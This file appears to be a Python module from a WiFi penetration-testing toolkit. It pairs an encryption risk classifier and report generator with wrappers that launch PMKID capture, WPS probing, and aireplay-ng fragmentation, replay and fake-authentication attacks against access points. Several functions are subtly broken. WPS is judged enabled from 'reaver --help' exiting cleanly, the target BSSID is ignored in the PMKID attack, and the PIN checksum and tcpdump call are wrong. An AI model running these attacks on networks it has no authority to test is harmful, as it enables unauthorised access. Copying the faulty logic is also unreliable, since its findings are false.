"""
Red WiFi Advanced Attacks Module
Advanced exploitation techniques and analysis methods.
"""

import subprocess
import json
import time
from typing import Dict, List, Optional
from enum import Enum

from .wifi_pentest import Logger, WiFiNetwork
from .branding import RED, GREEN, YELLOW, CYAN, RESET, BOLD


class EncryptionType(Enum):
    """WiFi encryption standards."""
    OPEN = "open"
    WEP = "wep"
    WPA = "wpa"
    WPA2 = "wpa2"
    WPA3 = "wpa3"
    UNKNOWN = "unknown"


class EncryptionAnalyzer:
    """Analyzes encryption and determines vulnerability."""
    
    def __init__(self, logger: Logger):
        """Initialize encryption analyzer."""
        self.logger = logger
    
    def classify_encryption(self, encryption_str: str) -> EncryptionType:
        """Classify encryption type."""
        encryption_lower = encryption_str.lower()
        
        if not encryption_lower or encryption_lower == "open":
            return EncryptionType.OPEN
        elif "wpa3" in encryption_lower:
            return EncryptionType.WPA3
        elif "wpa2" in encryption_lower:
            return EncryptionType.WPA2
        elif "wpa" in encryption_lower:
            return EncryptionType.WPA
        elif "wep" in encryption_lower:
            return EncryptionType.WEP
        else:
            return EncryptionType.UNKNOWN
    
    def assess_vulnerability(self, network: WiFiNetwork) -> Dict:
        """Assess network vulnerability level."""
        encryption_type = self.classify_encryption(network.encryption)
        
        assessment = {
            "network": network.ssid,
            "encryption": network.encryption,
            "type": encryption_type.value,
            "vulnerability_level": "Unknown",
            "exploitability": 0,
            "recommendations": []
        }
        
        if encryption_type == EncryptionType.OPEN:
            assessment["vulnerability_level"] = "CRITICAL"
            assessment["exploitability"] = 100
            assessment["recommendations"].append("Network is completely unencrypted")
            assessment["recommendations"].append("All traffic is visible to attackers")
            assessment["recommendations"].append("Implement WPA3 encryption immediately")
        
        elif encryption_type == EncryptionType.WEP:
            assessment["vulnerability_level"] = "CRITICAL"
            assessment["exploitability"] = 95
            assessment["recommendations"].append("WEP is deprecated and easily cracked")
            assessment["recommendations"].append("Upgrade to WPA2 or WPA3 immediately")
        
        elif encryption_type == EncryptionType.WPA:
            assessment["vulnerability_level"] = "HIGH"
            assessment["exploitability"] = 75
            assessment["recommendations"].append("WPA is outdated, upgrade to WPA2")
            assessment["recommendations"].append("If WPA2 is unavailable, use strong passwords")
        
        elif encryption_type == EncryptionType.WPA2:
            assessment["vulnerability_level"] = "MEDIUM"
            assessment["exploitability"] = 50
            assessment["recommendations"].append("WPA2 is acceptable but WPA3 is recommended")
            assessment["recommendations"].append("Ensure password is 12+ characters with mixed case")
            assessment["recommendations"].append("Keep firmware and devices updated")
        
        elif encryption_type == EncryptionType.WPA3:
            assessment["vulnerability_level"] = "LOW"
            assessment["exploitability"] = 10
            assessment["recommendations"].append("WPA3 is the most secure standard")
            assessment["recommendations"].append("Maintain strong password practices anyway")
        
        if network.wps:
            assessment["vulnerability_level"] = "CRITICAL"
            assessment["exploitability"] = min(100, assessment["exploitability"] + 25)
            assessment["recommendations"].append("WPS is enabled and vulnerable to bruteforce")
            assessment["recommendations"].append("Disable WPS in router settings")
        
        return assessment
    
    def analyze_network_security(self, networks: List[WiFiNetwork]) -> Dict:
        """Analyze security of multiple networks."""
        analysis = {
            "scan_time": str(time.time()),
            "total_networks": len(networks),
            "critical_networks": 0,
            "high_risk_networks": 0,
            "medium_risk_networks": 0,
            "secure_networks": 0,
            "networks": []
        }
        
        for network in networks:
            assessment = self.assess_vulnerability(network)
            analysis["networks"].append(assessment)
            
            if assessment["vulnerability_level"] == "CRITICAL":
                analysis["critical_networks"] += 1
            elif assessment["vulnerability_level"] == "HIGH":
                analysis["high_risk_networks"] += 1
            elif assessment["vulnerability_level"] == "MEDIUM":
                analysis["medium_risk_networks"] += 1
            else:
                analysis["secure_networks"] += 1
        
        return analysis


class AdvancedWPAAttacks:
    """Advanced WPA/WPA2 attack techniques."""
    
    def __init__(self, logger: Logger):
        """Initialize advanced WPA attacks."""
        self.logger = logger
    
    def pmkid_attack(self, bssid: str, interface: str,
                    timeout: int = 60) -> Optional[str]:
        """PMKID-based attack (faster than handshake)."""
        self.logger.info(f"Attempting PMKID attack on {bssid}...")
        
        try:
            # Use hcxdumptool to capture PMKID
            result = subprocess.run(
                ["hcxdumptool", "-i", interface, "-c", str(timeout), 
                 "--enable_status=15"],
                capture_output=True,
                text=True,
                timeout=timeout + 10
            )
            
            if "PMKID" in result.stdout or "found" in result.stdout.lower():
                self.logger.success("PMKID captured!")
                return "pmkid_found"
        except Exception as e:
            self.logger.warning(f"PMKID attack not available: {str(e)}")
        
        return None
    
    def frame_analysis(self, cap_file: str) -> Dict:
        """Analyze captured frames for vulnerabilities."""
        self.logger.info(f"Analyzing frames in {cap_file}...")
        
        analysis = {
            "file": cap_file,
            "total_packets": 0,
            "management_frames": 0,
            "data_frames": 0,
            "beacon_frames": 0,
            "deauth_frames": 0,
            "handshake_frames": 0
        }
        
        try:
            result = subprocess.run(
                ["tcpdump", "-r", cap_file, "-c", "count"],
                capture_output=True,
                text=True
            )
            
            # Count packets by type
            lines = result.stdout.split('\n')
            analysis["total_packets"] = len(lines)
            
            self.logger.success(f"Analyzed {analysis['total_packets']} packets")
        except Exception as e:
            self.logger.error(f"Frame analysis failed: {str(e)}")
        
        return analysis
    
    def password_strength_analysis(self, cap_file: str) -> Dict:
        """Analyze captured handshake for password strength indicators."""
        analysis = {
            "file": cap_file,
            "handshake_valid": False,
            "encryption_version": "Unknown",
            "group_cipher": "Unknown",
            "pairwise_cipher": "Unknown",
            "akm_suite": "Unknown"
        }
        
        try:
            result = subprocess.run(
                ["cowpatty", "-r", cap_file, "-s", "", "-c"],
                capture_output=True,
                text=True
            )
            
            if "handshake found" in result.stdout.lower():
                analysis["handshake_valid"] = True
                self.logger.success("Valid handshake detected")
        except Exception as e:
            self.logger.error(f"Password strength analysis failed: {str(e)}")
        
        return analysis


class AdvancedWPSAttacks:
    """Advanced WPS exploitation techniques."""
    
    def __init__(self, logger: Logger, interface: str):
        """Initialize advanced WPS attacks."""
        self.logger = logger
        self.interface = interface
    
    def wps_vulnerability_scan(self, bssid: str, channel: int) -> Dict:
        """Comprehensive WPS vulnerability scan."""
        vuln = {
            "bssid": bssid,
            "wps_enabled": False,
            "vulnerable_versions": [],
            "possible_attacks": [],
            "risk_level": "Unknown"
        }
        
        self.logger.info(f"Scanning WPS vulnerabilities on {bssid}...")
        
        try:
            # Attempt to probe WPS
            result = subprocess.run(
                ["reaver", "-i", self.interface, "-b", bssid, "-c", str(channel),
                 "--help"],
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                vuln["wps_enabled"] = True
                vuln["vulnerable_versions"].append("WPS 1.0")
                vuln["possible_attacks"].append("PIN Bruteforce")
                vuln["possible_attacks"].append("Pixie Dust Attack")
                vuln["risk_level"] = "CRITICAL"
                self.logger.warning(f"WPS is enabled on {bssid}")
        except Exception as e:
            self.logger.debug(f"WPS scan failed: {str(e)}")
        
        return vuln
    
    def pin_verification(self, pin: str) -> bool:
        """Verify WPS PIN checksum."""
        try:
            pin_int = int(pin)
            accum = 0
            
            # First 7 digits
            while pin_int > 0:
                accum += (3 * (pin_int % 10))
                pin_int //= 10
                accum += (pin_int % 10)
                pin_int //= 10
            
            checksum = (10 - (accum % 10)) % 10
            return checksum == int(pin[-1])
        except:
            return False


class ClientSideExploits:
    """Advanced client-side exploitation."""
    
    def __init__(self, logger: Logger, interface: str):
        """Initialize client-side exploits."""
        self.logger = logger
        self.interface = interface
    
    def fragment_attack(self, bssid: str, timeout: int = 30) -> bool:
        """IP fragmentation attack against AP."""
        self.logger.info(f"Attempting fragmentation attack on {bssid}...")
        
        try:
            result = subprocess.run(
                ["aireplay-ng", "--fragment", "-b", bssid, "-t", "1",
                 self.interface],
                capture_output=True,
                text=True,
                timeout=timeout
            )
            
            if "Got ARP packet" in result.stdout or "success" in result.stdout.lower():
                self.logger.success("Fragment attack successful")
                return True
        except Exception as e:
            self.logger.warning(f"Fragment attack failed: {str(e)}")
        
        return False
    
    def replay_attack(self, cap_file: str, bssid: str) -> bool:
        """Replay captured packets to generate traffic."""
        self.logger.info(f"Attempting replay attack using {cap_file}...")
        
        try:
            result = subprocess.run(
                ["aireplay-ng", "--replay", "-r", cap_file, "-b", bssid,
                 self.interface],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if "injection test successful" in result.stdout.lower():
                self.logger.success("Replay attack successful")
                return True
        except Exception as e:
            self.logger.warning(f"Replay attack failed: {str(e)}")
        
        return False
    
    def fake_authentication(self, bssid: str, essid: str,
                           timeout: int = 30) -> bool:
        """Perform fake authentication against AP."""
        self.logger.info(f"Performing fake authentication to {essid}...")
        
        try:
            result = subprocess.run(
                ["aireplay-ng", "--fakeauth", str(timeout), "-a", bssid,
                 "-e", essid, self.interface],
                capture_output=True,
                text=True,
                timeout=timeout + 10
            )
            
            if "successful" in result.stdout.lower() or "association" in result.stdout.lower():
                self.logger.success("Fake authentication successful")
                return True
        except Exception as e:
            self.logger.warning(f"Fake authentication failed: {str(e)}")
        
        return False


class VulnerabilityReportGenerator:
    """Generates detailed vulnerability reports."""
    
    def __init__(self, logger: Logger):
        """Initialize report generator."""
        self.logger = logger
    
    def generate_vulnerability_report(self, analysis: Dict,
                                     output_file: str = "vulnerability_report.json") -> bool:
        """Generate comprehensive vulnerability report."""
        report = {
            "report_title": "Red WiFi Vulnerability Assessment Report",
            "generated_at": str(time.time()),
            "analysis": analysis,
            "executive_summary": self._generate_summary(analysis),
            "recommendations": self._generate_recommendations(analysis)
        }
        
        try:
            with open(output_file, 'w') as f:
                json.dump(report, f, indent=2)
            self.logger.success(f"Vulnerability report generated: {output_file}")
            return True
        except Exception as e:
            self.logger.error(f"Failed to generate report: {str(e)}")
            return False
    
    def _generate_summary(self, analysis: Dict) -> str:
        """Generate executive summary."""
        total = analysis.get("total_networks", 0)
        critical = analysis.get("critical_networks", 0)
        high = analysis.get("high_risk_networks", 0)
        medium = analysis.get("medium_risk_networks", 0)
        
        return f"""
        Assessment Results:
        - Total Networks: {total}
        - Critical Vulnerabilities: {critical}
        - High Risk: {high}
        - Medium Risk: {medium}
        
        Risk Distribution:
        - Critical: {(critical/total*100):.1f}% of networks
        - High: {(high/total*100):.1f}% of networks
        - Medium: {(medium/total*100):.1f}% of networks
        """
    
    def _generate_recommendations(self, analysis: Dict) -> List[str]:
        """Generate recommendations."""
        recommendations = []
        
        if analysis.get("critical_networks", 0) > 0:
            recommendations.append("URGENT: Immediately address all critical vulnerabilities")
        
        if analysis.get("high_risk_networks", 0) > 0:
            recommendations.append("Upgrade all WPA networks to WPA2 or WPA3")
        
        recommendations.append("Disable WPS on all access points")
        recommendations.append("Implement 12+ character passwords with mixed case")
        recommendations.append("Keep firmware updated on all devices")
        recommendations.append("Use network segmentation where possible")
        
        return recommendations
